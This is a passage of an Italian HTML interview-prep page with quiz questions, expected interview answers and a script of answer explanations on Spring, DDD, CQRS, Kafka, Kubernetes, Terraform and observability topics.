                    <h4><span>Q5.</span> Perché l'Aggregate Root è l'unico punto di accesso per modificare l'Aggregate?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q55" id="q55a" value="a">
                            <label for="q55a">Per ridurre il numero di classi nel sistema</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q55" id="q55b" value="b">
                            <label for="q55b">Per garantire che gli invarianti di business siano sempre rispettati</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q55" id="q55c" value="c">
                            <label for="q55c">Per migliorare le performance delle query</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q55" id="q55d" value="d">
                            <label for="q55d">Perché JPA richiede una singola Entity root</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q55')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q55"></div>
                </div>
            </section>

            <!-- Questions Section Modulo 11 -->
            <section class="section" id="modulo11-questions">
                <h2>Domande da Colloquio - Modulo 11</h2>

                <div class="info-box">
                    <h4>Q: Spiega cosa sono i Bounded Context e perché sono importanti.</h4>
                    <p><strong>Risposta attesa:</strong> Un Bounded Context è un confine esplicito dove un modello di dominio è valido. Lo stesso termine può avere significati diversi in contesti diversi - "Product" nel Sales context ha prezzo e descrizione, nel Warehouse context ha SKU e posizione scaffale. Sono importanti perché: 1) Evitano un modello "god class" che cerca di rappresentare tutto. 2) Permettono a team diversi di lavorare indipendentemente. 3) Permettono scelte tecniche diverse per contesto. 4) Mappano naturalmente ai microservizi. I contesti comunicano tramite Context Mapping (ACL, Open Host, etc.).</p>
                </div>

                <div class="info-box">
                    <h4>Q: Qual è la differenza tra Clean Architecture e Hexagonal Architecture?</h4>
                    <p><strong>Risposta attesa:</strong> Condividono lo stesso principio fondamentale: il dominio al centro, dipendenze verso l'interno. Clean Architecture (Uncle Bob) enfatizza i layer concentrici: Entities → Use Cases → Interface Adapters → Frameworks. Hexagonal (Ports & Adapters, Alistair Cockburn) enfatizza la simmetria: il dominio al centro con porte (interfacce) e adattatori (implementazioni) sia per input (driving) che output (driven). In pratica sono molto simili. La differenza principale è il vocabolario: Clean usa "layers", Hexagonal usa "ports/adapters".</p>
                </div>

                <div class="info-box">
                    <h4>Q: Quando useresti Event Sourcing invece di CRUD tradizionale?</h4>
                    <p><strong>Risposta attesa:</strong> Event Sourcing quando: 1) Audit trail è un requisito (finanza, healthcare, legal). 2) Vuoi "time travel" - ricostruire stato a qualsiasi momento. 3) Il dominio è naturalmente event-driven. 4) Vuoi debugging avanzato (replay eventi). 5) Analytics storiche complesse. NON usare per: CRUD semplice, team senza esperienza, quando la complessità non è giustificata. Il costo è: eventual consistency, versioning eventi, gestione proiezioni. Può essere applicato solo ad alcuni aggregate, non a tutto il sistema.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Come gestisci la consistenza tra Read e Write model in CQRS?</h4>
                    <p><strong>Risposta attesa:</strong> La consistenza è eventuale, non immediata. Il Write model salva eventi/stato, poi il Read model si aggiorna asincronamente (via eventi, message queue, o polling). Strategie: 1) Accettare eventual consistency (la UI può mostrare "processing"). 2) Read-your-writes: dopo un comando, la UI legge direttamente dal Write model per quella entità. 3) Polling con retry finché il Read model si aggiorna. 4) WebSocket/SSE per notificare quando il Read model è pronto. La latenza tipica è millisecondi-secondi. Per operazioni critiche, usa transazioni distribuite o saga pattern.</p>
                </div>
            </section>

        </main>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-java.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-json.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-yaml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-docker.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-groovy.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
    <script>
        // Quiz feedback explanations
        const explanations = {
            q1: {
                correct: 'c',
                correctText: '✅ Corretto! Questo è il classico problema della self-invocation. Quando methodA() chiama methodB() internamente, la chiamata NON passa attraverso il proxy Spring, quindi l\'annotazione @Transactional(REQUIRES_NEW) viene completamente ignorata. Entrambe le operazioni avvengono nella stessa transazione, e quando l\'eccezione viene lanciata, tutta la transazione fa rollback.',
                incorrectText: {
                    a: '❌ Sbagliato. Questa risposta sarebbe corretta SE la chiamata passasse attraverso il proxy, ma qui c\'è il problema della self-invocation. Quando un metodo chiama un altro metodo della stessa classe con this.methodB() (anche implicito), bypassa il proxy Spring. REQUIRES_NEW non ha alcun effetto.',
                    b: '❌ Parzialmente corretto sul risultato, ma per il motivo sbagliato. Entrambi fanno rollback, vero, ma non semplicemente perché l\'eccezione si propaga. Il punto chiave è che REQUIRES_NEW NON funziona a causa della self-invocation. Senza questo concetto, non avresti dimostrato la comprensione del proxy pattern.',
                    d: '❌ Sbagliato. Il codice compila perfettamente. Puoi avere quanti @Transactional vuoi nello stesso service. Il problema è che le annotazioni sui metodi interni vengono ignorate quando chiamati internamente (self-invocation).'
                }
            },
            q2: {
                correct: 'b',
                correctText: '✅ Corretto! L\'affermazione B è FALSA. Con RS256 (algoritmo asimmetrico), il JWT viene FIRMATO con la chiave privata ma può essere VALIDATO da chiunque possieda la chiave pubblica. Questo è proprio il vantaggio: puoi distribuire la chiave pubblica a tutti i microservizi che devono validare i token, senza esporre la chiave privata.',
                incorrectText: {
                    a: '❌ Questa affermazione è VERA. Il payload JWT è solo Base64 encoded, non encrypted. Chiunque può decodificarlo con un semplice base64 decode. Per questo non dovresti MAI inserire dati sensibili nel payload.',
                    c: '❌ Questa affermazione è VERA. I JWT sono stateless by design. Una volta emesso un token, rimane valido fino alla scadenza. Per revocare un JWT hai bisogno di meccanismi aggiuntivi come una blacklist di token o short-lived tokens con refresh token rotation.',
                    d: '❌ Questa affermazione è VERA. La signature è calcolata sull\'header e payload. Se qualcuno modifica il payload, la signature non corrisponderà più e il token verrà rifiutato durante la validazione.'
                }
            },
            q3: {
                correct: 'd',
                correctText: '✅ Corretto! Con due collection di tipo List, un singolo JOIN FETCH o EntityGraph causerebbe un MultipleBagFetchException (o peggio, un Cartesian Product con risultati duplicati). Le soluzioni valide sono: (1) cambiare una delle collection in Set, permettendo così il JOIN FETCH di entrambe, oppure (2) usare due query separate con @BatchSize per ottimizzare il lazy loading.',
                incorrectText: {
                    a: '❌ Sbagliato. Questa query causerebbe un MultipleBagFetchException! Hibernate non permette di fare JOIN FETCH di due "bag" (List non ordinate) contemporaneamente perché non può distinguere i duplicati nel Cartesian Product risultante.',
                    b: '❌ Sbagliato e pericoloso! FetchType.EAGER è quasi sempre una cattiva idea. Caricheresti sempre entrambe le collection anche quando non servono, e potresti comunque incorrere nel problema del Cartesian Product con query inefficienti.',
                    c: '❌ Sbagliato. @EntityGraph con due collection List ha lo stesso problema del JOIN FETCH: MultipleBagFetchException. EntityGraph è solo zucchero sintattico sopra JOIN FETCH.'
                }
            },
            q4: {
                correct: 'a',
                correctText: '✅ Corretto! I proxy AOP vengono creati durante postProcessAfterInitialization(). A questo punto il bean è stato completamente inizializzato (@PostConstruct già eseguito), e il BeanPostProcessor può sostituire il bean originale con un proxy che lo avvolge. Questo è il motivo per cui @PostConstruct viene eseguito sulla classe reale, non sul proxy.',
                incorrectText: {
                    b: '❌ Sbagliato. Durante l\'instantiation (fase 1), Spring crea semplicemente l\'istanza del bean usando il costruttore. Il proxy viene creato molto dopo, quando il bean è completamente configurato.',
                    c: '❌ Sbagliato. @PostConstruct viene eseguito PRIMA della creazione del proxy. Infatti, @PostConstruct viene chiamato sulla classe reale, ed è per questo che all\'interno di @PostConstruct non puoi fare self-invocation con aspetti che funzionino.',
                    d: '❌ Sbagliato. postProcessBeforeInitialization() viene eseguito PRIMA di @PostConstruct e dell\'initialization. Il proxy viene creato DOPO, in postProcessAfterInitialization().'
                }
            },
            q5: {
                correct: 'c',
                correctText: '✅ Corretto! I livelli di isolamento sono gerarchici. Phantom Reads sono l\'anomalia "più difficile" da prevenire, e per prevenirla devi prima prevenire tutte le anomalie più "leggere" (Dirty Reads e Non-Repeatable Reads). Non esiste un livello che prevenga i Phantom ma permetta i Non-Repeatable. L\'ordine è: READ_UNCOMMITTED < READ_COMMITTED < REPEATABLE_READ < SERIALIZABLE.',
                incorrectText: {
                    a: '❌ Sbagliato. READ_COMMITTED previene solo i Dirty Reads. Sia Non-Repeatable Reads che Phantom Reads sono ancora possibili.',
                    b: '❌ Sbagliato. REPEATABLE_READ previene Dirty Reads e Non-Repeatable Reads, ma permette ancora Phantom Reads (in alcuni database). È l\'opposto di quello che chiede la domanda.',
                    d: '❌ Sbagliato. SERIALIZABLE previene TUTTE le anomalie (Dirty, Non-Repeatable, e Phantom). Non permette nessuna delle due.'
                }
            },
            // Modulo 2 - Testing
            q6: {
                correct: 'b',
                correctText: '✅ Corretto! Qui stiamo verificando un SIDE-EFFECT: l\'invio di un\'email. Non ci interessa il valore di ritorno, ma verificare CHE l\'email venga inviata e CON QUALI parametri. Questo è esattamente il caso d\'uso di un Mock con behavior verification (verify()).',
                incorrectText: {
                    a: '❌ Sbagliato. Uno Stub fornisce risposte predefinite, ma non verifica che il metodo sia stato chiamato. Se EmailService.send() non venisse mai chiamato, il test passerebbe comunque! Non stiamo testando un valore di ritorno, ma un side-effect.',
                    c: '❌ Non è sbagliato in assoluto, ma non è l\'approccio migliore. Un Fake è utile per Integration Test o quando hai bisogno di un\'implementazione funzionante. Per un Unit Test dove vuoi verificare l\'interazione, un Mock è più diretto e leggibile.',
                    d: '❌ Sbagliato. Uno Spy avvolge un oggetto REALE. Non vuoi che il test invii email vere! Inoltre, lo Spy è utile quando hai bisogno del comportamento reale di alcuni metodi, non quando vuoi sostituire completamente la dipendenza.'
                }
            },
            q7: {
                correct: 'c',
                correctText: '✅ Corretto! I test E2E sono intrinsecamente più "flaky" perché dipendono da molti fattori: network latency, database state, external services availability, browser rendering timing, ecc. Un fallimento può essere causato da qualsiasi componente del sistema, non necessariamente dal codice modificato.',
                incorrectText: {
                    a: '❌ Sbagliato. La Test Pyramid suggerisce esattamente l\'opposto: i test E2E dovrebbero essere il 5-10% del totale. Il 70-80% dovrebbe essere coperto da Unit Test, che sono più veloci, economici e affidabili.',
                    b: '❌ Sbagliato. "Affidabile" qui è ambiguo. Gli Integration Test possono avere falsi positivi (test che passano ma il codice ha bug) o falsi negativi (test che falliscono per ragioni esterne come database non disponibile). Gli Unit Test con mock corretti sono più deterministici.',
                    d: '❌ Sbagliato. Il "test-first" approach significa scrivere test prima del codice, non tutti i test insieme in anticipo. Ogni test guida l\'implementazione incrementale.'
                }
            },
            q9: {
                correct: 'a',
                correctText: '✅ Corretto! Questo è un caso perfetto per un Mock con behavior verification. Puoi configurare il mock per fallire le prime N chiamate (thenThrow().thenThrow().thenReturn()), e poi verificare con verify(mock, times(3)) che il retry sia avvenuto. È veloce, deterministico, e testa esattamente la logica di retry.',
                incorrectText: {
                    b: '❌ Sbagliato. Un test E2E con gateway di staging è lento, costoso, e difficile da rendere deterministico. Come simuli esattamente 2 fallimenti seguiti da un successo? Inoltre, dipendi dalla disponibilità del servizio esterno.',
                    c: '❌ Sbagliato. Uno Stub che ritorna sempre successo non ti permette di testare la retry logic! Non saprai mai se il retry viene effettivamente eseguito quando il gateway fallisce.',
                    d: '❌ Sbagliato. La retry logic è logica di business che può (e deve) essere testata in isolamento. Anzi, gli Unit Test sono ideali per questo caso perché puoi controllare esattamente quando il mock fallisce e quando succede.'
                }
            },
            q10: {
                correct: 'b',
                correctText: '✅ Corretto! Test B usa await() con timeout per aspettare eventual consistency. Questo tipo di test è notoriamente flaky perché: (1) il timing può variare in base al carico del sistema, (2) 5 secondi potrebbero non bastare in CI con risorse limitate, (3) race condition tra indexing e query. I test che dipendono da timing/async sono la fonte principale di flakiness.',
                incorrectText: {
                    a: '❌ Sbagliato. Test A è un Unit Test puro con mock deterministico. Non c\'è nulla di flaky: il mock ritorna sempre lo stesso valore, il test passerà sempre (o fallirà sempre se c\'è un bug).',
                    c: '❌ Sbagliato. Test C testa una somma di interi. Non ci sono problemi di floating point con int (quelli si verificano con float/double). Questo test è completamente deterministico.',
                    d: '❌ Sbagliato. Test D è un Integration Test standard con DB. Con @Transactional e rollback automatico (o DB in-memory pulito), non ci sono collisioni di ID. Il test è deterministico.'
                }
            },
            // Modulo 3 - Architettura & Scalabilità
            q11: {
                correct: 'c',
                correctText: '✅ Corretto! Quando un Circuit Breaker è in HALF-OPEN, sta "testando" se il servizio downstream è tornato sano. Se la richiesta di test fallisce, significa che il servizio non si è ancora ripreso, quindi il breaker torna in OPEN e ricomincia il timer di attesa. Solo se la richiesta ha successo torna in CLOSED.',
                incorrectText: {
                    a: '❌ Sbagliato. Lo stato HALF-OPEN permette un numero limitato di richieste di test (configurabile, spesso 1). Se fallisce, non continua a testare ma torna in OPEN per proteggere il sistema.',
                    b: '❌ Sbagliato. CLOSED significa "tutto ok, lascia passare tutte le richieste". Un fallimento in HALF-OPEN indica che il servizio NON è tornato sano, quindi tornare in CLOSED sarebbe pericoloso.',
                    d: '❌ Sbagliato. Non esiste uno stato DISABLED nel pattern standard del Circuit Breaker. Il ciclo è sempre: CLOSED ↔ OPEN ↔ HALF-OPEN.'
                }
            },
            q12: {
                correct: 'b',
                correctText: '✅ Corretto! Un sistema AP (Availability over Consistency) durante una partition continua a rispondere alle richieste anche se non può garantire che tutti i nodi abbiano gli stessi dati. Questo significa che utenti diversi potrebbero vedere versioni diverse dei dati (stale reads) o che scritture su nodi diversi potrebbero divergere. Sistemi come Cassandra e DynamoDB seguono questo modello.',
                incorrectText: {
                    a: '❌ Sbagliato. Rifiutare le scritture ma permettere le letture è un compromesso, ma non è la definizione di AP. Un sistema AP cerca di mantenere availability per TUTTE le operazioni.',
                    c: '❌ Sbagliato. Bloccare tutte le richieste è esattamente l\'opposto di Availability. Questa sarebbe la scelta di un sistema CP (Consistency over Availability).',
                    d: '❌ Sbagliato. L\'elezione di un leader è una tecnica per mantenere consistency (sistemi CP come MongoDB). Durante una partition, se non c\'è quorum, un sistema CP rifiuta le richieste piuttosto che rischiare inconsistenza.'
                }
            },
            q13: {
                correct: 'a',
                correctText: '✅ Corretto! Write-Behind (o Write-Back) scrive prima in cache e poi asincronamente (in batch) al database. Questo minimizza la latenza di scrittura perché l\'applicazione non deve aspettare la persistenza su DB. Il trade-off è che se la cache crasha prima del flush, i dati non ancora persistiti vanno persi. È ideale per scenari come analytics, logging, o contatori dove la perdita occasionale è accettabile.',
                incorrectText: {
                    b: '❌ Sbagliato. Write-Through scrive SINCRONAMENTE sia in cache che in DB. La latenza di scrittura è ALTA (somma di entrambe le scritture), non bassa. È il pattern giusto quando la consistency è prioritaria.',
                    c: '❌ Sbagliato. Cache-Aside (Lazy Loading) riguarda principalmente le LETTURE. Per le scritture, tipicamente si scrive direttamente al DB e si invalida/aggiorna la cache. Non ottimizza la latenza di scrittura.',
                    d: '❌ Sbagliato. Read-Through è un pattern di LETTURA: la cache carica automaticamente dal DB quando c\'è un miss. Non riguarda le scritture.'
                }
            },
            q14: {
                correct: 'd',
                correctText: '✅ Corretto! Con hash modulo N, se aggiungi o rimuovi un server (N cambia), TUTTE le chiavi vengono rimappate (k mod N diverso da k mod N±1). Con Consistent Hashing, solo le chiavi che "appartengono" al nodo aggiunto/rimosso vengono spostate (circa 1/N del totale). Questo è cruciale per cache distribuite dove rimappare tutto significherebbe cache miss massivi.',
                incorrectText: {
                    a: '❌ Sbagliato. Il Consistent Hashing è leggermente PIÙ costoso da calcolare (richiede trovare il nodo successivo sul ring). Il vantaggio non è la velocità di calcolo.',
                    b: '❌ Sbagliato. Il Consistent Hashing base NON garantisce distribuzione uniforme - alcuni nodi potrebbero avere più chiavi di altri. Si usano "virtual nodes" per migliorare la distribuzione, ma non è perfetta.',
                    c: '❌ Sbagliato. Entrambi gli approcci usano funzioni hash standard e supportano gli stessi tipi di chiavi. La differenza è come viene usato il risultato dell\'hash, non l\'input.'
                }
            },
            q15: {
                correct: 'c',
                correctText: '✅ Corretto! Quando il dominio di business non è ancora ben definito, i boundaries dei microservizi sono difficili da tracciare correttamente. Sbagliare i boundaries porta a "distributed monolith" - tutti gli svantaggi di entrambi gli approcci. Un monolite permette di refactorare facilmente mentre si impara il dominio, e si può sempre estrarre microservizi dopo quando i boundaries sono chiari (Monolith First approach di Martin Fowler).',
                incorrectText: {
                    a: '❌ Sbagliato. Il numero di utenti non determina l\'architettura. Monoliti ben progettati possono scalare a milioni di utenti (vedi Stack Overflow). La questione è se hai bisogno di scaling DIVERSO per parti diverse del sistema.',
                    b: '❌ Sbagliato. Avere esperienza con Kubernetes può facilitare i microservizi, ma non è un motivo per sceglierli. La scelta architetturale deve essere guidata dai requisiti di business e team, non dalla tecnologia che conosci.',
                    d: '❌ Sbagliato. Requisiti di scaling molto diversi tra componenti sono effettivamente un buon motivo per considerare i microservizi (puoi scalare indipendentemente). Questo è un fattore PRO microservizi, non pro monolite.'
                }
            },
            // Modulo 4 - Database & Messaging
            q16: {
                correct: 'b',
                correctText: '✅ Corretto! In Kafka, ogni partition può essere assegnata a UN SOLO consumer per consumer group. Con 6 partizioni e 8 consumer, solo 6 consumer riceveranno una partition ciascuno. I 2 consumer extra resteranno idle in standby, pronti a subentrare se uno degli altri fallisce (failover automatico).',
                incorrectText: {
                    a: '❌ Sbagliato. Kafka NON crea partizioni automaticamente in base ai consumer. Il numero di partizioni è definito alla creazione del topic (o modificato manualmente). È il contrario: devi dimensionare le partizioni in base al parallelismo desiderato.',
                    c: '❌ Sbagliato. Il round-robin avviene a livello di PARTIZIONE, non di consumer. Un messaggio va sempre alla stessa partition (basato su key o round-robin del producer), e quella partition è assegnata a un solo consumer del gruppo.',
                    d: '❌ Sbagliato. Kafka non rifiuta i consumer in eccesso. Li tiene nel gruppo come "idle" pronti per il failover. Questo è utile per high availability.'
                }
            },
            q17: {
                correct: 'd',
                correctText: '✅ Corretto! Fanout Exchange è progettato esattamente per questo use case: ignora completamente il routing key e inoltra ogni messaggio a TUTTE le queue collegate. È il pattern publish-subscribe puro. Ogni subscriber (email, SMS, push) ha la propria queue collegata al fanout, e tutti ricevono ogni messaggio.',
                incorrectText: {
                    a: '❌ Funzionerebbe, ma è over-engineered. Direct Exchange con lo stesso routing key richiede di mantenere la stessa key su tutti i binding. Fanout è più semanticamente corretto e più semplice.',
                    b: '❌ Funzionerebbe con pattern #, ma Topic Exchange è progettato per routing selettivo basato su pattern. Usarlo per broadcast è come usare una regex quando basta un semplice match.',
                    c: '❌ Headers Exchange è il più complesso, usato per routing basato su attributi multipli. Overkill per un semplice broadcast.'
                }
            },
            q18: {
                correct: 'c',
                correctText: '✅ Corretto! Kafka soddisfa tutti e 3 i requisiti: (1) I messaggi sono persistiti e rileggibi da qualsiasi offset (replay per debug). (2) Consumer groups diversi processano indipendentemente gli stessi messaggi. (3) Messaggi con la stessa key vanno sempre alla stessa partition, dove l\'ordine è garantito. RabbitMQ non supporta il replay nativamente.',
                incorrectText: {
                    a: '❌ Sbagliato. RabbitMQ rimuove i messaggi dopo l\'ACK, anche con TTL lungo. Non puoi rileggere messaggi già consumati. Il TTL ritarda solo la scadenza di messaggi NON consumati.',
                    b: '❌ Sbagliato. Multiple queue con Topic Exchange permettono a più consumer di ricevere gli stessi messaggi, ma (1) niente replay dopo consumo, (2) nessuna garanzia di ordine attraverso multiple queue.',
                    d: '❌ Sbagliato. Redis Pub/Sub è fire-and-forget: se il subscriber non è connesso, perde il messaggio. Non c\'è persistenza né replay. Redis Streams è diverso e più simile a Kafka, ma non è Pub/Sub.'
                }
            },
            q19: {
                correct: 'a',
                correctText: '✅ Corretto! Un Document DB come MongoDB è ideale per prodotti con attributi variabili. Ogni documento può avere campi diversi (laptop.cpu, tshirt.size) senza modifiche allo schema. Il pattern EAV in SQL è un anti-pattern noto per complessità delle query e pessime performance. Graph DB è per relazioni, Key-Value non supporta query sugli attributi.',
                incorrectText: {
                    b: '❌ Sbagliato. EAV (Entity-Attribute-Value) è considerato un anti-pattern SQL. Query come "trova laptop con RAM > 16GB" diventano JOIN complessi e lentissimi. È difficile da indicizzare e le query sono illeggibili.',
                    c: '❌ Sbagliato. Graph DB eccelle per relazioni (social network, raccomandazioni), non per dati con attributi variabili. Per "prodotti simili" potrebbe essere utile, ma non per il catalogo base.',
                    d: '❌ Sbagliato. Key-Value store (Redis) è ottimo per cache, ma non puoi fare query come "tutti i laptop rossi con prezzo < 1000€". Supporta solo lookup per key esatta.'
                }
            },
            q20: {
                correct: 'b',
                correctText: '✅ Corretto! acks controlla quante repliche devono confermare la scrittura prima che il producer consideri il messaggio "committed". acks=1: solo il leader conferma (veloce, ma rischio perdita se leader crasha prima della replica). acks=all: tutte le repliche in-sync devono confermare (più lento, ma massima durabilità). acks=0: fire-and-forget, nessuna conferma.',
                incorrectText: {
                    a: '❌ Sbagliato. acks non riguarda i consumer, ma la REPLICAZIONE tra broker. I consumer non sono coinvolti nel processo di ack del producer.',
                    c: '❌ Sbagliato. La compressione è configurata separatamente (compression.type). acks riguarda solo la conferma di scrittura.',
                    d: '❌ Sbagliato. Le transazioni Kafka si abilitano con transactional.id e enable.idempotence. acks=all è necessario per exactly-once, ma da solo non abilita le transazioni.'
                }
            },
            // Modulo 5: Cloud & DevOps
            q21: {
                correct: 'c',
                correctText: '✅ Corretto! Questo è il problema classico del Docker layer caching. Quando COPY . . è prima di npm install, OGNI modifica a qualsiasi file invalida il layer COPY. Tutti i layer successivi (npm install, npm build) vengono invalidati e rieseguiti. La soluzione è copiare prima package.json, poi npm install, e infine COPY . . per il resto del codice.',
                incorrectText: {
                    a: '❌ Sbagliato. Docker non può sapere che npm build dipende solo dai file TypeScript. Vede solo che il layer COPY è cambiato, quindi invalida TUTTI i layer successivi, incluso npm install.',
                    b: '❌ Sbagliato. Hai modificato un file, quindi il layer COPY . . è invalidato. Docker DEVE rieseguire quel layer e tutti quelli successivi.',
                    d: '❌ Sbagliato. I comandi RUN NON sono "sempre cached". Sono cached solo se TUTTI i layer precedenti sono ancora validi. Se COPY cambia, RUN viene rieseguito.'
                }
            },
            q22: {
                correct: 'b',
                correctText: '✅ Corretto! La readinessProbe controlla se il Pod può ricevere traffico, NON se deve essere riavviato. Se la readinessProbe fallisce, Kubernetes rimuove il Pod dagli endpoint del Service (quindi non riceve più traffico), ma il Pod continua a girare. Solo la livenessProbe può causare un restart. Questo è utile per Pod temporaneamente sovraccarichi che devono "riprendersi" senza essere riavviati.',
                incorrectText: {
                    a: '❌ Sbagliato. Il restart è controllato SOLO dalla livenessProbe. La readinessProbe controlla solo il traffico in ingresso, non il ciclo di vita del container.',
                    c: '❌ Sbagliato. Nessun Pod viene terminato se la livenessProbe passa. La readinessProbe non può causare terminazione o ricreazione.',
                    d: '❌ Sbagliato. La readinessProbe ha un effetto concreto: rimuove il Pod dagli endpoint del Service. Questo significa che il load balancer smette di inviare traffico a quel Pod.'
                }
            },
            q23: {
                correct: 'd',
                correctText: '✅ Corretto! L\'HPA calcola la percentuale basandosi sulle REQUESTS, non sui limits. Se requests.cpu è 200m e la target utilization è 70%, lo scaling scatta quando il Pod usa 140m (200m × 0.70). I limits definiscono il massimo che il container può usare, ma l\'HPA usa i requests come baseline per il calcolo della percentuale di utilizzo.',
                incorrectText: {
                    a: '❌ Sbagliato. L\'HPA usa i REQUESTS come base per il calcolo, non i limits. I limits sono solo un cap massimo, non influenzano il target dell\'HPA.',
                    b: '❌ Sbagliato. L\'HPA scala basandosi sull\'utilizzo dei singoli Pod rispetto ai loro requests, non sull\'utilizzo totale del nodo.',
                    c: '❌ Sbagliato. È assolutamente determinabile! L\'HPA usa una formula precisa: target = requests × targetPercentage. Con 200m requests e 70% target, lo scaling scatta a 140m.'
                }
            },
            q24: {
                correct: 'a',
                correctText: '✅ Corretto! Un aumento del tasso di errore di 50 volte (da 0.1% a 5%) è un segnale inequivocabile di un problema serio. In un canary deployment, il principio fondamentale è "fail fast": se le metriche indicano un problema, fai rollback immediatamente. Il canary esiste proprio per catturare questi problemi con impatto limitato (solo 10% del traffico). Continuare o aumentare il traffico esporrebbe più utenti al problema.',
                incorrectText: {
                    b: '❌ Sbagliato. Il 5% di errori in assoluto potrebbe sembrare basso, ma il confronto con la baseline (0.1%) mostra un peggioramento di 50x. Il canary deployment richiede confronto con la versione stable, non soglie assolute.',
                    c: '❌ Sbagliato. Aumentare il traffico significa esporre più utenti a una versione problematica. Il canary ha già raccolto abbastanza dati: 50x più errori è statisticamente significativo.',
                    d: '❌ Sbagliato. Ignorare un incremento di 50x nel tasso di errore è pericoloso. Gli errori potrebbero peggiorare sotto carico maggiore o accumularsi nel tempo.'
                }
            },
            q25: {
                correct: 'c',
                correctText: '✅ Corretto! Questo è esattamente il vantaggio principale del Blue-Green deployment: rollback istantaneo. L\'ambiente Blue è ancora attivo e pronto (non è stato terminato dopo lo switch). Basta modificare il Service selector o la configurazione del load balancer per reindirizzare immediatamente tutto il traffico a Blue. Nessun deployment, nessuna attesa, rollback in secondi.',
                incorrectText: {
                    a: '❌ Sbagliato. Fix forward richiede tempo (diagnosi, fix, test, build, deploy). Con un bug critico in produzione, vuoi minimizzare il tempo di esposizione. Il rollback istantaneo è sempre preferibile per bug critici.',
                    b: '❌ Sbagliato. Rolling update è lento e non sfrutti il vantaggio del Blue-Green. Hai già l\'ambiente Blue pronto, perché fare un rolling update quando puoi switchare istantaneamente?',
                    d: '❌ Sbagliato. Scalare Green a 0 è inutilmente lento e non garantisce uno switch pulito. Il load balancer o Service già punta a Blue, basta cambiare quella configurazione.'
                }
            },
            // Modulo 6: Advanced Topics 2026
            q26: {
                correct: 'c',
                correctText: '✅ Corretto! Il context propagation è fondamentale: quando A decide di tracciare (campionare) un trace, quella decisione viene propagata a B e C via headers (es. W3C traceparent). Ogni servizio downstream onora la decisione del parent. Questo garantisce che un trace sia completo o completamente assente, mai parziale. Se ogni servizio decidesse indipendentemente, avresti traces "rotti" impossibili da correlare.',
                incorrectText: {
                    a: '❌ Sbagliato. Se B e C facessero sampling indipendente, un trace campionato al 10% in A avrebbe solo 1% di probabilità di essere completo (0.1 × 0.1 × 0.1). Il context propagation esiste proprio per evitare questo problema.',
                    b: '❌ Sbagliato. Il sampling non si applica "solo all\'entry point" in modo magico. È il context propagation esplicito (via headers) che porta la decisione di sampling ai servizi downstream.',
                    d: '❌ Sbagliato. I servizi non consultano il collector per decidere se tracciare. La decisione è presa localmente e propagata via headers HTTP/gRPC. Il collector riceve solo i dati già generati.'
                }
            },
            q27: {
                correct: 'b',
                correctText: '✅ Corretto! "Must be replaced" (o "forces replacement") significa che la modifica richiesta non può essere applicata in-place. Terraform distruggerà la risorsa esistente e ne creerà una nuova. Per un\'istanza EC2, questo significa downtime: l\'istanza viene terminata, poi ne viene creata una nuova con nuovo IP, nuovo instance ID, etc. È critico notare questi "replace" nel plan e usare create_before_destroy o strategie blue-green per evitare downtime.',
                incorrectText: {
                    a: '❌ Sbagliato. "In-place update" è indicato da "will be updated" nel plan, non "must be replaced". Replace significa distruzione + ricreazione.',
                    c: '❌ Sbagliato. Di default Terraform fa destroy-then-create, non crea backup. Solo con lifecycle { create_before_destroy = true } viene creata prima la nuova risorsa.',
                    d: '❌ Sbagliato. Non è solo un warning: se fai apply, la risorsa VERRÀ distrutta e ricreata. Il plan ti sta avvisando di cosa succederà, non chiedendo conferma.'
                }
            },
            q28: {
                correct: 'd',
                correctText: '✅ Corretto! Una similarity threshold di 0.8 (80%) è molto alta per cosine similarity su embeddings. Query semanticamente equivalenti ma con wording diverso (es. "come faccio il rimborso" vs "procedura restituzione") potrebbero avere similarity 0.7-0.75 e essere scartate. Abbassare a 0.6-0.7 cattura più risultati rilevanti. Il trade-off è più noise, che può essere filtrato con re-ranking o aumentando top-K.',
                incorrectText: {
                    a: '❌ Sbagliato. La context window riguarda l\'LLM, non il retrieval. Se i documenti fossero troppo lunghi, il problema sarebbe nella generazione (risposta troncata), non nel retrieval (documenti non trovati).',
                    b: '❌ Sbagliato. Se il vector DB non avesse memoria sufficiente, avresti errori di sistema o crash, non semplicemente risultati mancanti. Gli embeddings sono relativamente piccoli (pochi KB ciascuno).',
                    c: '❌ Sbagliato. Il problema descritto è che i documenti non vengono TROVATI nel retrieval, non che l\'LLM li ignora. L\'hallucination è un problema diverso (rispondere senza contesto).'
                }
            },
            q29: {
                correct: 'a',
                correctText: '✅ Corretto! Questa è una "gotcha" classica di Prometheus. In realtà, rate() E increase() gestiscono automaticamente i counter reset (restart dell\'applicazione). Se vedi valori negativi, probabilmente stai usando una raw subtraction invece di rate/increase, oppure c\'è un problema di clock skew. La funzione rate() calcola (valore_finale - valore_iniziale) / tempo, ma detecta i reset e compensa. Il problema potrebbe essere reale se usi resets() che conta i reset senza compensare.',
                incorrectText: {
                    b: '❌ Sbagliato. I counter sono corretti per contare eventi cumulativi. I Gauge sono per valori che possono salire e scendere (temperatura, connessioni attive). Un http_requests_total DEVE essere un counter.',
                    c: '❌ Sbagliato. I counter resettano legittimamente quando l\'applicazione riavvia. È comportamento normale e atteso. Prometheus gestisce questo caso con rate()/increase().',
                    d: '❌ Sbagliato. Non devi filtrare manualmente i punti. Le funzioni rate() e increase() di Prometheus gestiscono automaticamente i reset. Se vedi negativi, il problema è altrove (query sbagliata, scrape interval, clock skew).'
                }
            },
            q30: {
